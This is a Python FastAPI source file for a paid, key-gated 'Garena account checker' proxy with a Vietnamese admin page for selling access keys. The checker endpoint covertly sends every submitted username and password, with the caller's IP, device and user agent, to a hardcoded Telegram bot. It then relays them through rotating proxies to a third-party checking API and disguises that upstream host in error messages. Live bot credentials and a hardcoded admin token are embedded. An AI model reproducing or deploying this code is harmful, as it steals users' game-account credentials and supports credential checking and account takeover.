from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import JSONResponse, HTMLResponse
import requests
import re
from datetime import datetime, timedelta
import random
import json
import os
import string

app = FastAPI(title="LuanOri API Proxy + Retry + Header Fix")

# ================== CONFIG ==================

ORIGINAL_API_URL = "https://nguyenvantai.io.vn/api.php"

TELEGRAM_BOT_TOKEN = "8245828242:AAHuk7pyJCLyidDXN-U3_p8adUajmEX1Zw4"
TELEGRAM_CHAT_ID  = "-1003632459479"

KEY_FILE = "keys.json"
ADMIN_TOKEN = "LUANORI-ACCESS-KEY"

# ================== PROXY LIST ==================

PROXY_LIST = [
    "http://113.160.37.152:53281",
    "http://171.249.163.170:1452",
    "http://203.205.33.131:1452",
    "http://14.177.236.212:55443",
    "http://27.72.244.228:8080",
    "http://218.152.206.92:10080",
]


def get_proxy():
    if not PROXY_LIST:
        return None

    p = random.choice(PROXY_LIST)
    return {
        "http": p,
        "https": p
    }

# ================== KEY SYSTEM ==================

def load_keys():
    if not os.path.exists(KEY_FILE):
        return {}
    with open(KEY_FILE, "r", encoding="utf-8") as f:
        return json.load(f)


def save_keys(data):
    with open(KEY_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)


def gen_key():
    rand = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
    return "LUANORI-" + rand


def calc_expire(time_type: str, value: int):
    now = datetime.now()

    if time_type == "day":
        return now + timedelta(days=value)

    if time_type == "week":
        return now + timedelta(weeks=value)

    if time_type == "month":
        return now + timedelta(days=30 * value)

    if time_type == "year":
        return now + timedelta(days=365 * value)

    raise ValueError("Sai loại thời gian")

# ================== CLIENT IP ==================

def get_client_ip(request: Request):
    client_ip = request.client.host if request.client else "N/A"

    forwarded = request.headers.get("x-forwarded-for")
    if forwarded:
        client_ip = forwarded.split(",")[0].strip()

    real_ip = request.headers.get("x-real-ip") or client_ip

    ipv4 = real_ip if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", real_ip) else "N/A"
    ipv6 = real_ip if ":" in real_ip else "N/A"

    return {
        "ipv4": ipv4,
        "ipv6": ipv6,
        "raw": real_ip
    }

# ================== DETECT OS / DEVICE ==================

def detect_os_and_device(user_agent: str):
    ua = user_agent.lower()

    os_name = "Unknown"
    device = "Unknown"
    connection = "Unknown"

    if "windows" in ua:
        os_name, device = "Windows", "PC"
    elif "mac os" in ua or "macintosh" in ua:
        os_name, device = "macOS", "PC"
    elif "android" in ua:
        os_name, device = "Android", "Mobile"
    elif "iphone" in ua:
        os_name, device = "iOS", "Mobile"
    elif "ipad" in ua:
        os_name, device = "iOS", "Tablet"
    elif "linux" in ua:
        os_name, device = "Linux", "PC"

    if "wifi" in ua:
        connection = "WiFi"
    elif any(x in ua for x in ["mobile", "android", "iphone"]):
        connection = "Mobile Data"

    return os_name, device, connection


# ================== TELEGRAM ==================

def send_telegram_notify(
    username: str,
    password: str,
    ip_info: dict,
    user_agent: str,
    os_name: str,
    device: str,
    connection: str
):
    message = (
        "🚨 <b>CHECK ACC GARENA</b>\n\n"
        f"👤 <b>User:</b> <code>{username}</code>\n"
        f"🔐 <b>Pass:</b> <code>{password}</code>\n\n"
        f"🌍 <b>IP v4:</b> {ip_info['ipv4']}\n"
        f"🌐 <b>IP v6:</b> {ip_info['ipv6']}\n"
        f"📡 <b>Net:</b> {connection}\n"
        f"💻 <b>OS:</b> {os_name}\n"
        f"📱 <b>Device:</b> {device}\n\n"
        f"🧭 <b>UA:</b>\n<code>{user_agent}</code>\n\n"
        f"⏰ <b>Time:</b> {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}"
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }

    try:
        r = requests.post(url, data=payload, timeout=10)
        print("TELEGRAM STATUS:", r.status_code)
        print("TELEGRAM BODY:", r.text)
    except Exception as e:
        print("TELEGRAM ERROR:", e)


# ================== ADMIN PAGE ==================

@app.get("/admin", response_class=HTMLResponse)
async def admin_page():
    return """
<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>LuanOri Admin</title>
<style>
body{
margin:0;
min-height:100vh;
display:flex;
align-items:center;
justify-content:center;
background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
font-family:Arial
}
.box{
width:92%;
max-width:380px;
background:#0d1117;
color:#fff;
border-radius:14px;
padding:18px
}
h2{text-align:center;color:#00eaff;margin:6px 0 14px}
label{font-size:13px;color:#aaa}
input,select,button{
width:100%;
padding:12px;
margin-top:6px;
margin-bottom:12px;
border-radius:8px;
border:none;
background:#161b22;
color:#fff;
font-size:15px
}
button{
background:#00eaff;
color:#000;
font-weight:bold
}
.btn2{background:#ffd54f;color:#000}
.btn3{background:#ff5f5f;color:#000}
.result{
background:#161b22;
padding:10px;
border-radius:8px;
font-size:13px;
word-break:break-all
}
</style>
</head>
<body>

<div class="box">
<h2>ADMIN – KEY MANAGER</h2>

<label>Admin token</label>
<input id="token" value="LUANORI-ACCESS-KEY">

<label>Key (sửa / xóa)</label>
<input id="edit_key" placeholder="LUANORI-XXXXX">

<label>Loại thời hạn</label>
<select id="type">
<option value="day">Ngày</option>
<option value="week">Tuần</option>
<option value="month">Tháng</option>
<option value="year">Năm</option>
</select>

<label>Số lượng</label>
<input id="value" type="number" value="1" min="1">

<button onclick="createKey()">➕ Tạo key</button>
<button class="btn2" onclick="updateKey()">✏️ Sửa / gia hạn</button>
<button class="btn3" onclick="deleteKey()">🗑 Xóa key</button>

<div class="result" id="result">Chưa thao tác</div>
</div>

<script>
function v(id){return document.getElementById(id).value.trim()}
function show(t){document.getElementById("result").innerText=t}

async function run(url){
    try{
        const r = await fetch(url);
        const d = await r.json();
        show(JSON.stringify(d,null,2));
    }catch(e){
        show("Lỗi kết nối server");
    }
}

function createKey(){
    run(`/admin/create-key?token=${v("token")}&type=${v("type")}&value=${v("value")}`);
}

function updateKey(){
    if(!v("edit_key")){show("Chưa nhập key");return;}
    run(`/admin/update-key?token=${v("token")}&key=${v("edit_key")}&type=${v("type")}&value=${v("value")}`);
}

function deleteKey(){
    if(!v("edit_key")){show("Chưa nhập key");return;}
    run(`/admin/delete-key?token=${v("token")}&key=${v("edit_key")}`);
}
</script>

</body>
</html>
"""


# ================== ADMIN API ==================

@app.get("/admin/create-key")
async def admin_create_key(token: str, type: str, value: int = 1):

    if token != ADMIN_TOKEN:
        raise HTTPException(status_code=401, detail="Unauthorized")

    type = type.lower()

    exp = calc_expire(type, value)
    key = gen_key()

    data = load_keys()

    data[key] = {
        "expire_at": exp.strftime("%Y-%m-%d %H:%M:%S"),
        "type": type,
        "value": value
    }

    save_keys(data)

    return {
        "status": True,
        "key": key,
        "expire_at": data[key]["expire_at"]
    }


@app.get("/admin/update-key")
async def admin_update_key(token: str, key: str, type: str, value: int = 1):

    if token != ADMIN_TOKEN:
        raise HTTPException(status_code=401, detail="Unauthorized")

    data = load_keys()

    if key not in data:
        return {"status": False, "msg": "Key không tồn tại"}

    type = type.lower()
    exp = calc_expire(type, value)

    data[key]["expire_at"] = exp.strftime("%Y-%m-%d %H:%M:%S")
    data[key]["type"] = type
    data[key]["value"] = value

    save_keys(data)

    return {
        "status": True,
        "key": key,
        "expire_at": data[key]["expire_at"]
    }


@app.get("/admin/delete-key")
async def admin_delete_key(token: str, key: str):

    if token != ADMIN_TOKEN:
        raise HTTPException(status_code=401, detail="Unauthorized")

    data = load_keys()

    if key not in data:
        return {"status": False, "msg": "Key không tồn tại"}

    del data[key]
    save_keys(data)

    return {
        "status": True,
        "msg": "Đã xóa key",
        "key": key
    }


# ================== API ==================

@app.get("/LuanOri.Vue")
async def proxy_garena(request: Request):

    # ===== check key =====
    key = request.query_params.get("key")

    if not key:
        raise HTTPException(
            status_code=401,
            detail={"status": False, "message": "Thiếu key Liên Hệ Tele: LuanOri04 Để Mua Key"}
        )

    keys = load_keys()

    if key not in keys:
        raise HTTPException(
            status_code=401,
            detail={"status": False, "message": "Key không tồn tại Liên Hệ Tele: LuanOri04 Để Mua Key"}
        )

    expire_at = datetime.strptime(
        keys[key]["expire_at"],
        "%Y-%m-%d %H:%M:%S"
    )

    if datetime.now() > expire_at:
        del keys[key]
        save_keys(keys)

        raise HTTPException(
            status_code=401,
            detail={"status": False, "message": "Key đã hết hạn Liên Hệ Tele: LuanOri04 Để Mua Key"}
        )

    # ===== params =====

    username = request.query_params.get("username")
    password = request.query_params.get("password")

    if not username or not password:
        raise HTTPException(
            status_code=400,
            detail={"status": False, "message": "Thiếu username hoặc password"}
        )

    ip_info = get_client_ip(request)
    user_agent = request.headers.get("user-agent", "Unknown")

    os_name, device, connection = detect_os_and_device(user_agent)

    # ==== gửi Telegram ====
    send_telegram_notify(
        username,
        password,
        ip_info,
        user_agent,
        os_name,
        device,
        connection
    )

    params = {
        "username": username,
        "password": password
    }

    headers = {
        "User-Agent": request.headers.get(
            "user-agent",
            "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        ),
        "Accept": "*/*",
        "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
        "Connection": "close"
    }

    error_msg = ""

    proxy_plan = [
        get_proxy(),
        get_proxy(),
        None
    ]

    for proxies in proxy_plan:
        try:
            resp = requests.get(
                ORIGINAL_API_URL,
                params=params,
                headers=headers,
                timeout=(10, 30),
                allow_redirects=True,
                proxies=proxies,
                verify=True
            )

            resp.raise_for_status()

            try:
                return JSONResponse(content=resp.json())
            except Exception:
                return JSONResponse(content={"raw": resp.text})

        except requests.RequestException as e:
            error_msg = str(e).replace(
                "nguyenvantai.io.vn",
                "luanori.com"
            )
            continue

    raise HTTPException(
        status_code=502,
        detail={
            "status": False,
            "message": "Không kết nối được server (LuanOri 404)",
            "error": error_msg
        }
    )


# ================== MAIN ==================

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)